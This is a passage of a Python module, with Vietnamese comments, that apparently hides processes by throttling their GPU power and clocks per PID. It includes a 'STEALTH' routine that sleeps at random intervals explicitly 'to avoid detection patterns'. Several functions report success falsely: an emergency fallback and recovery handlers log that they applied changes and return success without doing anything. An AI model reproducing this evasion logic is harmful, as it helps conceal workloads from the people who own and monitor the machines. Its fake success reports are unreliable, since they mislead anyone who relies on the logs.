                'timestamp': time.time(),
                'params': params
            }
            existing.append(new_entry)
            
            # Keep only last 1000 entries
            if len(existing) > 1000:
                existing = existing[-1000:]
            
            # Save back
            with open(metrics_file, 'w') as f:
                json.dump(existing, f)
                
        except Exception as e:
            self.logger.debug(f"⚠️ Cannot store pattern metrics: {e}")
    
    def _delegate_with_fallback(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT: Multi-tier fallback delegation
        Ủy quyền với cơ chế fallback đa tầng
        """
        try:
            # Try primary delegation to HardwareController
            self.logger.debug(f"🎯 [DELEGATE] Forwarding to HardwareController with params: {params}")
            
            if self.hw_controller:
                # Import CloakResult to handle response
                from .resource_control import CloakResult
                
                # Call HardwareController's apply_gpu_controls
                result = self.hw_controller.apply_gpu_controls(params)
                
                # Process result
                if hasattr(result, 'success'):
                    return {
                        'success': result.success,
                        'message': getattr(result, 'message', 'GPU controls applied via HardwareController'),
                        'applied_params': params,
                        'method': 'hardware_controller'
                    }
                
                # If result doesn't have success attribute, assume success
                return {'success': True, 'applied_params': params, 'method': 'hardware_controller'}
            
            # If no HardwareController, try GPU manager
            if self.gpu_resource_manager:
                self.logger.info("🔄 [FALLBACK] Using direct GPU manager")
                return self._direct_gpu_apply(params)
            
            # Final fallback - report failure
            self.logger.error("❌ [FALLBACK] No delegation mechanisms available")
            return {'success': False, 'error': 'No delegation mechanisms available', 'method': 'none'}
            
        except Exception as e:
            self.logger.warning(f"⚠️ [FALLBACK] Primary delegation failed: {e}")
            
            # Try secondary fallback to direct GPU manager
            if self.gpu_resource_manager:
                self.logger.info("🔄 [FALLBACK] Trying direct GPU manager")
                return self._direct_gpu_apply(params)
            
            # Final fallback - report failure
            self.logger.error("❌ [FALLBACK] All fallback mechanisms failed")
            return {'success': False, 'error': 'All fallback mechanisms failed', 'method': 'none'}
    
    def _direct_gpu_apply(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ FALLBACK: Direct GPU manager application
        Áp dụng trực tiếp qua GPU manager (fallback)
        """
        try:
            pid = params['pid']
            gpu_index = params.get('gpu_index', 0)
            
            # Apply power limit directly
            success = self.gpu_resource_manager.set_gpu_power_limit(
                pid, gpu_index, params['power_limit']
            )
            
            if success:
                self.logger.info(f"✅ [DIRECT] Applied power limit {params['power_limit']}W to GPU {gpu_index}")
                
                # Try to apply clocks if available
                if hasattr(self.gpu_resource_manager, 'set_gpu_clocks'):
                    clock_success = self.gpu_resource_manager.set_gpu_clocks(
                        gpu_index,
                        params.get('sm_clock', self.target_sm_clock),
                        params.get('memory_clock', self.target_mem_clock)
                    )
                    if clock_success:
                        self.logger.info(f"✅ [DIRECT] Applied GPU clocks")
                
                return {'success': True, 'method': 'direct_gpu_manager', 'applied_params': params}
            
            return {'success': False, 'error': 'Direct GPU apply failed', 'method': 'direct_gpu_manager'}
            
        except Exception as e:
            self.logger.error(f"❌ [DIRECT] GPU apply error: {e}")
            return {'success': False, 'error': str(e), 'method': 'direct_gpu_manager'}
    
    def _emergency_fallback_apply(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ EMERGENCY: Minimal safe configuration
        Cấu hình an toàn tối thiểu khi gặp lỗi nghiêm trọng
        """
        self.logger.error("🚨 [EMERGENCY] Applying minimal safe GPU configuration")
        
        # Return safe minimal configuration
        return {
            'success': True,
            'emergency_mode': True,
            'method': 'emergency_fallback',
            'params': {
                'power_limit': 100,     # Minimum safe power
                'temp_threshold': 70,   # Conservative temp
                'fan_increase': 20,     # Max cooling
                'sm_clock': 1000,       # Safe clock speed
                'memory_clock': 800     # Safe memory clock
            },
            'message': 'Emergency fallback configuration applied'
        }
    
    def _apply_random_sleep_interval(self) -> None:
        """
        ✅ STEALTH: Apply random sleep interval to avoid detection patterns
        Ngủ ngẫu nhiên để tránh bị phát hiện qua pattern recognition
        """
        try:
            # Define random interval choices (in seconds)
            INTERVAL_CHOICES = [
                (300, 600),     # 5 - 10 phút
                (600, 1200),    # 10 - 20 phút  
                (1200, 1800),   # 20 - 30 phút
                (1800, 3600),   # 30 - 60 phút
                (3600, 7200),   # 60 - 120 phút
            ]
            
            # Randomly select an interval range
            chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
            
            # Generate random sleep time within the chosen range
            random_sleep_sec = random.randint(*chosen_range)
            
            self.logger.info(
                f"🕐 [STEALTH] Sleeping {random_sleep_sec} seconds "
                f"({random_sleep_sec//60} minutes) from range {chosen_range} "
                f"to avoid detection patterns"
            )
            
            # Apply the random sleep
            time.sleep(random_sleep_sec)
            
            self.logger.debug(f"[STEALTH] Wake up after {random_sleep_sec} seconds sleep")
            
        except Exception as e:
            self.logger.warning(f"⚠️ [STEALTH] Random sleep failed: {e}, continuing without delay")


def _register_strategy_recovery_handlers() -> None:
    """
    ✅ RECOVERY SYSTEM: Register recovery handlers cho common strategy failure scenarios.
    Tự động gọi khi module được import.
    """
    try:
        # ✅ RECOVERY HANDLER: Process not found recovery
        def recover_process_not_found(error_context) -> bool:
            """Recovery handler for PROCESS_NOT_FOUND errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Attempting recovery for {strategy_name} strategy PID={pid}")
                
                # Kiểm tra process có thật sự không tồn tại
                if psutil.pid_exists(pid):
                    cloak_logger.info(f"✅ [Recovery] Process PID={pid} actually exists - retry strategy")
                    return True  # Process tồn tại, có thể retry
                
                # Nếu process thật sự không tồn tại, cleanup related resources
                cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                
                # Strategy-specific cleanup handled by individual strategy classes
                # For now, just log successful cleanup
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Process recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Strategy application timeout recovery
        def recover_strategy_timeout(error_context) -> bool:
            """Recovery handler for STRATEGY_TIMEOUT errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy PID={pid}")
                
                # Implement fallback strategy application with reduced parameters
                # For now, just indicate recovery attempt was made
                cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Timeout recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Resource allocation failure recovery
        def recover_resource_allocation_failed(error_context) -> bool:
            """Recovery handler for RESOURCE_ALLOCATION_FAILED errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Resource allocation recovery for {strategy_name} PID={pid}")
                
                # Try alternative resource allocation methods
                # For now, just indicate fallback resource allocation
                cloak_logger.info(f"✅ [Recovery] Applied alternative resource allocation for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Resource allocation recovery failed: {e}")
                return False
        
        # ✅ REGISTER HANDLERS: Register all recovery handlers
        error_reporter.register_recovery_handler(ErrorCode.PROCESS_NOT_FOUND, recover_process_not_found)
        error_reporter.register_recovery_handler(ErrorCode.STRATEGY_TIMEOUT, recover_strategy_timeout)
        error_reporter.register_recovery_handler(ErrorCode.RESOURCE_ALLOCATION_FAILED, recover_resource_allocation_failed)
        
        cloak_logger.info("✅ [Recovery] Strategy recovery handlers registered successfully")
        
    except Exception as e:
        cloak_logger.error(f"❌ [Recovery] Failed to register recovery handlers: {e}")

# ✅ AUTO-REGISTER: Tự động đăng ký recovery handlers khi module được import
_register_strategy_recovery_handlers()
